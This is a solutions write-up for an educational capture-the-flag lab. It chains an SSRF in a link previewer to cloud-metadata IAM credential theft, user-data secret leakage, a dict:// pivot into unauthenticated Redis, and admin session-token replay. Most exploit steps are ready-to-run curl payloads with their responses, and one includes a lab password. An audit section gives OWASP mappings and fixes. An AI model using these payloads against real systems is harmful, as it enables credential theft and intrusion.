# CTF 6: Veridian Secure -- Solutions

## Credentials

- `abcd12` / *(see credentials.json)*
- `efgh34` / *(see credentials.json)*
- `ijkl56` / *(see credentials.json)*

---

## Flag 1: SSRF to Cloud Metadata -- IAM Credential Exfiltration

### Discovery Path

**Chain A (blog post):**
1. Log in and read the dashboard. The "Infrastructure Migration Notes" post mentions cloud metadata endpoints are accessible from the internal network.
2. Navigate to `/preview` (linked in the nav bar as "Link Previewer").

**Chain B (page source):**
1. View source on any page. The login page contains:
   ```html
   <!-- service status: /health -->
   ```
2. Visit `/health`:
   ```json
   {
     "service": "Veridian Secure Portal",
     "version": "3.2.1",
     "status": "operational",
     "ssrf_note": "preview fetches are server-side, no allowlist configured",
     "internal_hint": "cloud metadata available at standard endpoint",
     "admin_route": "/admin",
     "changelog": "/static/CHANGELOG.md"
   }
   ```
3. `ssrf_note` confirms server-side fetching. `internal_hint` points to cloud metadata.

**Chain C (preview page source):**
1. View source on `/preview`:
   ```html
   <!-- fetch endpoint: /api/preview -- no validation implemented yet, see issue #47 -->
   <!-- preview accepts JSON body: {"url": "https://example.com"} -->
   ```

### Exploit

First, log in and save the session cookie to a file (used by all subsequent steps):

```bash
curl -c cookies.txt -X POST http://localhost:5180/login \
  -d "username=abcd12&password=36fea3f062c" \
  -L
```

Step 1: Fetch the metadata directory listing.

```bash
curl -X POST http://localhost:5180/api/preview \
  -H "Content-Type: application/json" \
  -b cookies.txt \
  -d '{"url": "http://169.254.169.254/latest/meta-data/"}'
```

Response:
```
iam/
iam/security-credentials/
iam/security-credentials/veridian-prod-role
```

Step 2: Fetch the IAM credentials.

```bash
curl -X POST http://localhost:5180/api/preview \
  -H "Content-Type: application/json" \
  -b cookies.txt \
  -d '{"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/veridian-prod-role"}'
```

Response:
```json
{
  "Code": "Success",
  "Type": "AWS-HMAC",
  "AccessKeyId": "VRDNFAKEKEY01",
  "SecretAccessKey": "wJalrXUtnFEMI/FAKE/KEY",
  "Token": "durham-vsec-flag1{<per-user token>}",
  "Expiration": "2099-01-01T00:00:00Z"
}
```

**Flag 1:** `durham-vsec-flag1{...}` *(per-user, see flags.json)*

---

## Flag 2: Metadata Enumeration -- Bootstrap Script Leak

### Discovery Path

1. The CHANGELOG (`/static/CHANGELOG.md`, linked from the page footer) contains:
   ```
   [INFRA] Bootstrap script embedded in user-data for automated provisioning.
   ```
2. This hints that `/latest/user-data` contains infrastructure configuration.

### Exploit

```bash
curl -X POST http://localhost:5180/api/preview \
  -H "Content-Type: application/json" \
  -b cookies.txt \
  -d '{"url": "http://169.254.169.254/latest/user-data"}'
```

Response:
```bash
#!/bin/bash
# Veridian Secure -- cloud bootstrap script
# Generated: 2024-01-15
# Environment: production-internal

# Service configuration
REDIS_HOST=redis
REDIS_PORT=6379
# internal session store -- no auth configured (legacy deployment)

APP_PORT=8080
APP_HOST=0.0.0.0

# Deployment credentials (rotate quarterly)
# DEPLOY_TOKEN=durham-vsec-flag2{<per-user token>}

echo "Bootstrapping Veridian Secure portal..."
echo "Connecting to Redis at $REDIS_HOST:$REDIS_PORT"
echo "Starting application on $APP_HOST:$APP_PORT"
```

**Flag 2:** The `DEPLOY_TOKEN` comment value: `durham-vsec-flag2{...}` *(per-user, see flags.json)*

---

## Flag 3: Redis Pivot via dict:// Scheme

### Discovery Path

1. The bootstrap script from Flag 2 reveals `REDIS_HOST=redis`, `REDIS_PORT=6379`, and confirms no authentication.
2. The CHANGELOG contains:
   ```
   [SECURITY] Reminder: preview endpoint accepts any URL scheme.
              Ticket raised to restrict to http/https only. (unresolved)
   ```
3. The "Tech Debt Register" blog post mentions `dict://` and `gopher://` scheme support.

### Exploit

Step 1: Confirm Redis is reachable.

```bash
curl -X POST http://localhost:5180/api/preview \
  -H "Content-Type: application/json" \
  -b cookies.txt \
  -d '{"url": "dict://redis:6379/INFO server"}'
```

Response: Redis server info output confirming connectivity.

Step 2: Enumerate Redis keys.

```bash
curl -X POST http://localhost:5180/api/preview \
  -H "Content-Type: application/json" \
  -b cookies.txt \
  -d '{"url": "dict://redis:6379/KEYS *"}'
```

Response includes:
```
veridian:session:admin
veridian:incident:2024-03-15
veridian:flag3
```

Step 3: Retrieve Flag 3.

```bash
curl -X POST http://localhost:5180/api/preview \
  -H "Content-Type: application/json" \
  -b cookies.txt \
  -d '{"url": "dict://redis:6379/GET veridian:flag3"}'
```

**Flag 3:** `durham-vsec-flag3{...}` *(per-user, see flags.json)*

---

## Flag 4: Session Token Replay -- Admin Panel Access

### Discovery Path

1. Redis key enumeration from Flag 3 reveals `veridian:session:admin`.
2. The "Access Control Audit" blog post states admin sessions use `X-Session-Token` header.
3. The `/health` endpoint includes `"admin_route": "/admin"`.

### Exploit

Step 1: Retrieve the admin session token from Redis.

```bash
curl -X POST http://localhost:5180/api/preview \
  -H "Content-Type: application/json" \
  -b cookies.txt \
  -d '{"url": "dict://redis:6379/GET veridian:session:admin"}'
```

Response:
```
vsec-admin-sess-a1b2c3d4e5f6
```

Step 2: Access the admin dashboard. The player must also be logged in (session cookie required for flag personalisation).

```bash
curl http://localhost:5180/admin \
  -H "X-Session-Token: vsec-admin-sess-a1b2c3d4e5f6" \
  -b cookies.txt
```

Response: The admin dashboard HTML containing the classified incident report and Flag 4.

**Flag 4:** `durham-vsec-flag4{...}` *(per-user, see flags.json)*

---

## Summary

| Flag | Technique | Difficulty | OWASP |
|------|-----------|------------|-------|
| 1 | SSRF to cloud metadata (IMDSv1) | Intermediate | A10 |
| 2 | Metadata user-data enumeration | Intermediate | A10, A05 |
| 3 | SSRF via dict:// to unauthenticated Redis | Advanced | A10, A07 |
| 4 | Session token replay from Redis to admin panel | Advanced | A10, A07, A01 |

## Key Vulnerabilities

1. **SSRF (A10):** Unvalidated server-side URL fetch in the Link Previewer allows requests to internal services
2. **Security Misconfiguration (A05):** Cloud metadata accessible without IMDSv2 token; sensitive data in user-data script
3. **Security Misconfiguration (A07):** Unauthenticated Redis on internal network; no URL scheme restrictions
4. **Broken Access Control (A01):** Admin route protected only by a static session token header with no session binding

---

## Post-Design Audit

### Vulnerability Summary

- **Flag 1 — SSRF to cloud metadata (IMDSv1).** The `POST /api/preview` handler in `src/routes.rs::api_preview` calls `preview::fetch_url(url)` without validating the URL scheme or destination host. A player submits `http://169.254.169.254/latest/meta-data/iam/security-credentials/` (the AWS IMDSv1 endpoint, simulated by the `metadata` sidecar in `docker-compose.yml`); the server-side fetch reaches it because it shares the `veridian-internal` network. The flag is embedded in the simulated IAM credential response.
- **Flag 2 — Metadata user-data enumeration.** Continuing from Flag 1, the metadata sidecar exposes `/latest/user-data` returning a bootstrap script with embedded secrets (the flag-2 placeholder substituted at fetch time by `routes.rs` per-user-flag replacement logic). The vulnerability class is "sensitive data baked into cloud bootstrap scripts" — a real-world misconfiguration pattern.
- **Flag 3 — SSRF via `dict://` to Redis.** `preview::fetch_url` does not restrict URL schemes. Submitting `dict://redis:6379/INFO` triggers the dict protocol handler in `reqwest`, sending a CRLF-injection-style command to the unauthenticated Redis instance. Redis dumps server info including a stored session-token key whose value is the flag-3 wrapper; the response gets returned through the preview route.
- **Flag 4 — Session token replay.** Flag 3's Redis dump includes a real admin session token stored under a known key. The player extracts it and replays it as the `X-Session-Token` header on `GET /admin` (the route is gated only by header equality in `routes.rs::admin_panel`, not by session binding). The admin panel renders the per-user flag-4 sourced from the player's login session.

### OWASP Top 10 Classification

| Flag | OWASP 2021 | CWE | One-line justification |
|------|-----------|-----|------------------------|
| 1 | A10 — Server-Side Request Forgery | CWE-918 | Unvalidated user-controlled URL passed to a server-side HTTP fetch. |
| 2 | A05 — Security Misconfiguration | CWE-540 | Sensitive data in cloud bootstrap user-data accessible via metadata endpoint. |
| 3 | A10 — SSRF + A07 — Identification & Authentication Failures | CWE-918, CWE-306 | SSRF with unrestricted URL scheme reaches an unauthenticated Redis on the internal network. |
| 4 | A01 — Broken Access Control | CWE-639 | Admin route gated by static header token with no session binding; replay-able from any context. |

### Defence Recommendations

- **Flag 1 fix.** Validate the URL host against an allow-list of public domains before fetching. Reject IP-literal hosts entirely; reject hosts that resolve to private/link-local ranges. Migrate the simulated metadata service to IMDSv2 (token-based) — this would also block the vulnerability class at the AWS layer.
- **Flag 2 fix.** Never put secrets into cloud user-data; reference them at runtime from a managed secret store (KMS, Secrets Manager). Even if metadata exposure recurs, the secret is not present.
- **Flag 3 fix.** Restrict `preview::fetch_url` to `http://` and `https://` schemes only. Reject `dict://`, `gopher://`, `file://`, `ftp://`, etc. Combine with the host allow-list from Flag 1 fix; both layers must apply.
- **Flag 4 fix.** Bind admin session tokens to the authenticated user's login session id; reject tokens whose binding does not match the calling session. Header-only checks are not authentication.

### Unintended Solutions to Watch For

- **Direct host-network access to Redis.** Players who realise Redis is exposed could `redis-cli -h redis` from outside the container and harvest tokens directly. Blocked by `veridian-internal` network being a Docker-internal bridge — Redis is not exposed on the host. Confirmed via `docker-compose.yml` topology.
- **Reading `flags.json` on the host.** Out of scope; e2e harness runs against the running container.
- **Brute-forcing the admin token.** The token is generated per boot with sufficient entropy. Players hit the wall and pivot to the SSRF-Redis path. Intended.

### Skill Level & Realism Notes

- Target skill level: **intermediate → advanced**. SSRF basics in Flag 1, scheme/protocol smuggling in Flag 3 (genuine novelty for most students), and the multi-hop replay chain in Flag 4.
- Real-world analogue: Capital One 2019 (SSRF + IMDS + IAM) is the textbook reference; the `dict://` smuggling class is documented in Orange Tsai's SSRF research and several CTF write-ups (e.g. RealWorld CTF 2019/2020). Token replay against unauthenticated internal services maps to numerous internal pen-test findings.

### Lessons Learned (Design Retrospective)

- **Multi-container topology is the lesson and the bug.** The `metadata` and `redis` sidecars exist to make this CTF's SSRF chain meaningful. The compose file's `veridian-internal` network was originally a default bridge that exposed Redis on the host — fixed during testing once an unintended-solution path was demonstrated. Document the network topology clearly when evolving this CTF.
- **Per-user flag replacement happens server-side.** `routes.rs::api_preview` substitutes flag placeholders in fetched response bodies based on the calling session's username; this means that when a player's SSRF reaches the metadata service, the response they see contains *their* flag, not a shared one. Be careful when evolving the flag-substitution logic — regressions silently show wrong flags.
- **Empty `tests/` directory was a discoverability gap.** Phase 1a populated CTF6 with a contract suite via inline `#[cfg(test)]` modules in `routes.rs`; the discovery that CTF6 was Rust (not Python/FastAPI as the audit baseline assumed) caused the first plan deviation logged in `CTFs/workflow.md`.
- **Next time:** publish a `/health/ready` route that reports whether the metadata and Redis sidecars are reachable from the app container. Aids both player onboarding (clear when the stack isn't fully up) and the integration test harness for Phase 2.
